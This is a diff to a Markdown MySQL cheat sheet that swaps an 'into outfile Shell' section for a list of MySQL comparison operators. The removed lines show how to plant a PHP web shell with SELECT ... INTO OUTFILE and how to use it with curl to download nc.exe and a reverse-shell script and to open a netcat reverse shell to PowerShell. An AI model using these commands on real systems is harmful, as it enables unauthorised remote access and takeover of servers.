@@ -32,16 +32,34 @@ mysql -u root -p
 mysql -u root -p'password' -h $ip  -P $port
 ```
 
-## i7nto outfile Shell
-```sql
--- PHP
-SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE 'C:/wamp/www/shell.php';
-curl "http://$ip/shell.php?cmd=whoami"
-curl "http://$ip/shell.php?cmd=certutil+-urlcache+-f+http://$ip/nc.exe+nc.exe"
-curl "http://$ip/shell.php?cmd=wget+http://$ip/reverse_shell.sh"
-curl "http://127.0.0.1:8080/shell.php?cmd=nc.exe+$ip+4444+-e+powershell.exe"
-```
+## Comparison Operators
 
+[MySQL comparison operators](https://dev.mysql.com/doc/refman/8.0/en/comparison-operators.html)
+```sql
+>  -- Greater than operator
+>=  -- Greater than or equal operator
+<  -- Less than operator
+<>, !=  -- Not equal operator
+<=  -- Less than or equal operator
+<=>  -- NULL-safe equal to operator
+=  -- Equal operator
+BETWEEN ... AND ...  -- Whether a value is within a range of values
+COALESCE()  -- Return the first non-NULL argument
+GREATEST()  -- Return the largest argument
+IN()  -- Whether a value is within a set of values
+INTERVAL()  -- Return the index of the argument that is less than the first argument
+IS  -- Test a value against a boolean
+IS NOT  -- Test a value against a boolean
+IS NOT NULL  -- NOT NULL value test
+IS NULL  -- NULL value test
+ISNULL()  -- Test whether the argument is NULL
+LEAST()  -- Return the smallest argument
+LIKE  -- Simple pattern matching
+NOT BETWEEN ... AND ...  -- Whether a value is not within a range of values
+NOT IN()  -- Whether a value is not within a set of values
+NOT LIKE  -- Negation of simple pattern matching
+STRCMP()  -- Compare two strings
+```
 ## Show Databases
 
 ```sql
@@ -370,4 +388,6 @@ SELECT age, COUNT(age) FROM users GROUP BY age HAVING count(age) >=2;
 ```
 
 ## References
+
 [dev.mysql.com](https://dev.mysql.com/doc/refman/8.0/en/mysql-commands.html)
+[MySQL comparison operators](https://dev.mysql.com/doc/refman/8.0/en/comparison-operators.html)
